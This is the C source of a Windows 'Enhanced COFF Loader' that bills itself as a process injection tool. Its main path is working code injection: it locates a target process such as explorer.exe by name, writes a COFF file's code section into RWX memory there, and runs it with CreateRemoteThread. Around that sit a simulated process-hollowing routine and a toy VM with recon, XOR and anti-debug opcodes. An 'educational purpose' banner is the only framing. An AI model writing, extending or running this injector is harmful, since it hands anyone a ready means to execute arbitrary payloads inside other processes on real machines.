// loader_enhanced.c
// Enhanced loader with both simulation and real process injection capabilities
// FIXED: Removed C++ lambdas, fixed string operations, added real injection

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma pack(push,1)
typedef struct {
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
} COFFHeader;

typedef struct {
    char Name[8];
    uint32_t VirtualSize;
    uint32_t VirtualAddress;
    uint32_t SizeOfRawData;
    uint32_t PointerToRawData;
    uint32_t PointerToRelocations;
    uint32_t PointerToLinenumbers;
    uint16_t NumberOfRelocations;
    uint16_t NumberOfLinenumbers;
    uint32_t Characteristics;
} SectionHeader;
#pragma pack(pop)

// Enhanced VM state
typedef struct {
    uint8_t *memory;
    size_t mem_size;
    size_t pc;
    uint32_t regs[8]; // R0-R7 registers
    uint8_t *stack;
    size_t stack_ptr;
    int running;
} VMState;

// Host API callbacks
typedef void (*host_emit_fn)(const char *msg);
typedef void (*host_whoami_fn)(void);
typedef void (*host_getsysteminfo_fn)(void);
typedef void (*host_sleep_fn)(uint32_t ms);

static host_emit_fn HOST_EMIT = NULL;
static host_whoami_fn HOST_WHOAMI = NULL;
static host_getsysteminfo_fn HOST_GETSYSTEMINFO = NULL;
static host_sleep_fn HOST_SLEEP = NULL;

void register_host_emit(host_emit_fn f) { HOST_EMIT = f; }
void register_host_whoami(host_whoami_fn f) { HOST_WHOAMI = f; }
void register_host_getsysteminfo(host_getsysteminfo_fn f) { HOST_GETSYSTEMINFO = f; }
void register_host_sleep(host_sleep_fn f) { HOST_SLEEP = f; }

// Host API implementations as proper C functions
void host_emit_impl(const char *m) { 
    printf("[HOST] EMIT: %s\n", m); 
}

void host_whoami_impl(void) { 
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        printf("[HOST] WHOAMI: User='%s'\n", username);
    } else {
        printf("[HOST] WHOAMI: <unknown>\n");
    }
}

void host_getsysteminfo_impl(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    printf("[HOST] SYSINFO: Arch=%lu, CPUs=%lu, PageSize=%lu\n",
           si.dwProcessorType, si.dwNumberOfProcessors, si.dwPageSize);
}

void host_sleep_impl(uint32_t ms) {
    printf("[HOST] SLEEP: %u ms\n", ms);
    // Don't actually sleep in demo
}

// Real COFF loading and injection functions
BOOL InjectCOFFIntoProcess(DWORD pid, const char* coffPath) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID pRemoteCode = NULL;
    HANDLE hFile = NULL;
    DWORD fileSize = 0;
    LPVOID pFileData = NULL;
    DWORD bytesRead = 0;
    
    printf("[REAL INJECTION] Starting real injection into PID: %lu\n", pid);
    
    // 1. Open target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] Failed to open process: %d\n", GetLastError());
        return FALSE;
    }
    
    printf("[REAL INJECTION] Process opened successfully\n");
    
    // 2. Read COFF file
    hFile = CreateFileA(coffPath, GENERIC_READ, FILE_SHARE_READ, NULL, 
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open COFF file\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    
    fileSize = GetFileSize(hFile, NULL);
    pFileData = VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (!pFileData) {
        printf("[-] Failed to allocate memory for COFF file\n");
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    ReadFile(hFile, pFileData, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    
    printf("[REAL INJECTION] COFF file loaded: %lu bytes\n", bytesRead);
    
    // 3. Parse COFF and extract .text section
    PIMAGE_FILE_HEADER pCoffHeader = (PIMAGE_FILE_HEADER)pFileData;
    PIMAGE_SECTION_HEADER pSections = (PIMAGE_SECTION_HEADER)((BYTE*)pFileData + 
                                 sizeof(IMAGE_FILE_HEADER));
    
    // Find .text section
    PIMAGE_SECTION_HEADER pTextSection = NULL;
    for (int i = 0; i < pCoffHeader->NumberOfSections; i++) {
        if (strcmp((char*)pSections[i].Name, ".text") == 0) {
            pTextSection = &pSections[i];
            break;
        }
    }
    
    if (!pTextSection) {
        printf("[-] .text section not found\n");
        VirtualFree(pFileData, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[REAL INJECTION] Found .text section: %lu bytes\n", pTextSection->SizeOfRawData);
    
    // 4. Allocate memory in target process
    pRemoteCode = VirtualAllocEx(hProcess, NULL, pTextSection->SizeOfRawData,
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteCode) {
        printf("[-] Failed to allocate memory in target process: %d\n", GetLastError());
        VirtualFree(pFileData, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[REAL INJECTION] Memory allocated in target process: 0x%p\n", pRemoteCode);
    
    // 5. Write shellcode to target process
    LPVOID pTextData = (BYTE*)pFileData + pTextSection->PointerToRawData;
    if (!WriteProcessMemory(hProcess, pRemoteCode, pTextData, 
                           pTextSection->SizeOfRawData, NULL)) {
        printf("[-] Failed to write to target process memory: %d\n", GetLastError());
        VirtualFree(pFileData, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[REAL INJECTION] Shellcode written to target process\n");
    
    // 6. Create remote thread to execute shellcode
    hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                (LPTHREAD_START_ROUTINE)pRemoteCode, 
                                NULL, 0, NULL);
    if (!hThread) {
        printf("[-] Failed to create remote thread: %d\n", GetLastError());
        VirtualFree(pFileData, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] Successfully injected COFF into process %d\n", pid);
    printf("[+] Thread created: %d\n", GetThreadId(hThread));
    
    // Wait for thread completion (optional)
    printf("[REAL INJECTION] Waiting for thread completion...\n");
    WaitForSingleObject(hThread, 5000); // Wait up to 5 seconds
    
    // Cleanup
    CloseHandle(hThread);
    VirtualFree(pFileData, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    
    return TRUE;
}

// Process enumeration for target finding
DWORD FindProcessId(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

// Simulate process hollowing by creating a suspended process
HANDLE simulate_process_hollowing(const char *target_process) {
    printf("[INJECTION] Simulating process hollowing on: %s\n", target_process);
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    char cmdline[MAX_PATH];
    snprintf(cmdline, sizeof(cmdline), "%s", target_process);
    
    if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 
                      CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[INJECTION] Created suspended process PID: %lu\n", pi.dwProcessId);
        printf("[INJECTION] Main thread ID: %lu\n", pi.dwThreadId);
        return pi.hProcess;
    } else {
        printf("[INJECTION] Failed to create process (simulation only)\n");
        return INVALID_HANDLE_VALUE;
    }
}

// Enhanced VM with more realistic opcodes
void run_enhanced_vm(VMState *vm) {
    printf("[VM] Starting enhanced VM execution\n");
    
    while (vm->running && vm->pc < vm->mem_size) {
        uint8_t opcode = vm->memory[vm->pc++];
        
        switch (opcode) {
            case 0x01: { // EMIT_STRING
                if (vm->pc + 1 > vm->mem_size) { vm->running = 0; break; }
                uint8_t length = vm->memory[vm->pc++];
                if (vm->pc + length > vm->mem_size) { vm->running = 0; break; }
                
                char *message = malloc(length + 1);
                memcpy(message, vm->memory + vm->pc, length);
                message[length] = 0;
                
                if (HOST_EMIT) HOST_EMIT(message);
                free(message);
                vm->pc += length;
                break;
            }
            
            case 0x02: // WHOAMI
                if (HOST_WHOAMI) HOST_WHOAMI();
                break;
                
            case 0x03: { // PUSH_IMMEDIATE
                if (vm->pc + 4 > vm->mem_size) { vm->running = 0; break; }
                uint32_t value = *(uint32_t*)(vm->memory + vm->pc);
                vm->pc += 4;
                printf("[VM] PUSH 0x%08X\n", value);
                break;
            }
            
            case 0x04: // GET_SYSTEM_INFO
                if (HOST_GETSYSTEMINFO) HOST_GETSYSTEMINFO();
                break;
                
            case 0x05: { // SLEEP_MS
                if (vm->pc + 4 > vm->mem_size) { vm->running = 0; break; }
                uint32_t sleep_time = *(uint32_t*)(vm->memory + vm->pc);
                vm->pc += 4;
                printf("[VM] Sleeping for %u ms\n", sleep_time);
                if (HOST_SLEEP) HOST_SLEEP(sleep_time);
                break;
            }
            
            case 0x06: // ENCRYPTION_SIMULATION
                printf("[VM] Simulating encryption routine\n");
                // Simulate XOR encryption on a small buffer
                for (int i = 0; i < 16 && (vm->pc + i) < vm->mem_size; i++) {
                    vm->memory[vm->pc + i] ^= 0xAA;
                }
                break;
                
            case 0xFE: // ANTIDEBUG_CHECK (simulated)
                printf("[VM] Anti-debug check simulated\n");
                break;
                
            case 0xFF: // HALT
                vm->running = 0;
                printf("[VM] Execution halted\n");
                break;
                
            default:
                printf("[VM] Unknown opcode: 0x%02X at PC=0x%zX\n", opcode, vm->pc-1);
                break;
        }
    }
}

void print_separator(void) {
    printf("==================================================\n");
}

// Parse command line arguments
typedef struct {
    int real_injection;
    const char* target_process;
    const char* coff_file;
} CommandLineArgs;

CommandLineArgs parse_arguments(int argc, char** argv) {
    CommandLineArgs args = {0};
    
    if (argc == 4 && strcmp(argv[1], "--target") == 0) {
        // Real injection mode: loader_enhanced.exe --target process_name coff_file.obj
        args.real_injection = 1;
        args.target_process = argv[2];
        args.coff_file = argv[3];
    } else if (argc == 2) {
        // Simulation mode: loader_enhanced.exe coff_file.obj
        args.real_injection = 0;
        args.coff_file = argv[1];
    }
    
    return args;
}

// Real injection mode
int perform_real_injection(const char* target_process, const char* coff_file) {
    printf("[+] REAL INJECTION MODE ACTIVATED\n");
    printf("[+] Target: %s\n", target_process);
    printf("[+] COFF File: %s\n", coff_file);
    print_separator();
    
    DWORD pid = FindProcessId(target_process);
    if (pid == 0) {
        printf("[-] Process not found: %s\n", target_process);
        printf("[-] Available processes you can try:\n");
        printf("    - notepad.exe\n");
        printf("    - calc.exe\n"); 
        printf("    - explorer.exe\n");
        return 1;
    }
    
    printf("[+] Found process %s with PID: %d\n", target_process, pid);
    printf("[+] Injecting COFF file: %s\n", coff_file);
    
    if (InjectCOFFIntoProcess(pid, coff_file)) {
        printf("[+] Injection completed successfully\n");
        return 0;
    } else {
        printf("[-] Injection failed\n");
        return 1;
    }
}

// Simulation mode
int perform_simulation(const char* coff_file) {
    printf("[+] SIMULATION MODE\n");
    printf("[+] COFF File: %s\n\n", coff_file);
    
    // Simulate process hollowing
    HANDLE hProcess = simulate_process_hollowing("notepad.exe");
    if (hProcess != INVALID_HANDLE_VALUE) {
        printf("[INJECTION] Process created in suspended state\n");
        printf("[INJECTION] Simulating memory unmapping and COFF injection\n");
        TerminateProcess(hProcess, 0);
        CloseHandle(hProcess);
    }
    
    FILE *f = fopen(coff_file, "rb");
    if (!f) { 
        perror("fopen"); 
        return 1; 
    }

    COFFHeader hdr;
    if (fread(&hdr, sizeof(hdr), 1, f) != 1) { 
        fprintf(stderr, "Bad header\n"); 
        fclose(f); 
        return 1; 
    }

    long sect_offset = sizeof(COFFHeader) + hdr.SizeOfOptionalHeader;
    if (fseek(f, sect_offset, SEEK_SET) != 0) { 
        perror("fseek"); 
        fclose(f); 
        return 1; 
    }

    SectionHeader *sections = calloc(hdr.NumberOfSections, sizeof(SectionHeader));
    for (int i = 0; i < hdr.NumberOfSections; i++) {
        if (fread(&sections[i], sizeof(SectionHeader), 1, f) != 1) {
            fprintf(stderr, "Short sections\n"); 
            free(sections); 
            fclose(f); 
            return 1;
        }
    }

    // Extract all executable sections
    uint8_t *combined_code = NULL;
    size_t total_code_size = 0;
    
    for (int i = 0; i < hdr.NumberOfSections; i++) {
        char name[9]; 
        memcpy(name, sections[i].Name, 8); 
        name[8] = 0;
        
        if (sections[i].SizeOfRawData > 0) {
            printf("[LOADER] Mapping section '%s' (0x%X bytes)\n", 
                   name, sections[i].SizeOfRawData);
            
            uint8_t *section_data = malloc(sections[i].SizeOfRawData);
            if (!section_data) continue;
            
            if (fseek(f, sections[i].PointerToRawData, SEEK_SET) == 0 &&
                fread(section_data, 1, sections[i].SizeOfRawData, f) == sections[i].SizeOfRawData) {
                
                // Resize combined buffer
                uint8_t *new_combined = realloc(combined_code, total_code_size + sections[i].SizeOfRawData);
                if (new_combined) {
                    combined_code = new_combined;
                    memcpy(combined_code + total_code_size, section_data, sections[i].SizeOfRawData);
                    total_code_size += sections[i].SizeOfRawData;
                }
            }
            free(section_data);
        }
    }

    if (!combined_code || total_code_size == 0) {
        fprintf(stderr, "[LOADER] No executable code found\n");
        free(sections);
        fclose(f);
        return 1;
    }

    printf("[LOADER] Total mapped code size: %zu bytes\n", total_code_size);
    
    // Register enhanced host APIs
    register_host_emit(host_emit_impl);
    register_host_whoami(host_whoami_impl);
    register_host_getsysteminfo(host_getsysteminfo_impl);
    register_host_sleep(host_sleep_impl);

    // Initialize enhanced VM
    VMState vm = {0};
    vm.memory = combined_code;
    vm.mem_size = total_code_size;
    vm.pc = 0;
    vm.running = 1;
    vm.stack = malloc(4096);
    vm.stack_ptr = 0;
    
    printf("[LOADER] Starting enhanced VM execution\n");
    print_separator();
    
    run_enhanced_vm(&vm);
    
    print_separator();
    printf("[LOADER] Execution completed\n");
    
    // Cleanup
    free(vm.stack);
    free(combined_code);
    free(sections);
    fclose(f);
    
    return 0;
}

int main(int argc, char **argv) {
    printf("[+] Enhanced COFF Loader - Process Injection Tool\n");
    printf("[+] Educational Purpose Only - Authorized Testing Only\n");
    print_separator();
    
    // Parse command line arguments
    CommandLineArgs args = parse_arguments(argc, argv);
    
    if (args.real_injection) {
        // Real injection mode
        return perform_real_injection(args.target_process, args.coff_file);
    } else if (args.coff_file) {
        // Simulation mode
        return perform_simulation(args.coff_file);
    } else {
        // Usage information
        printf("Usage:\n");
        printf("  Simulation Mode: %s <coff_file.obj>\n", argv[0]);
        printf("  Real Injection:  %s --target <process_name> <coff_file.obj>\n", argv[0]);
        printf("\nExamples:\n");
        printf("  %s payload.obj\n", argv[0]);
        printf("  %s --target notepad.exe payload.obj\n", argv[0]);
        printf("\nWARNING: Real injection requires appropriate privileges and authorization.\n");
        return 2;
    }
}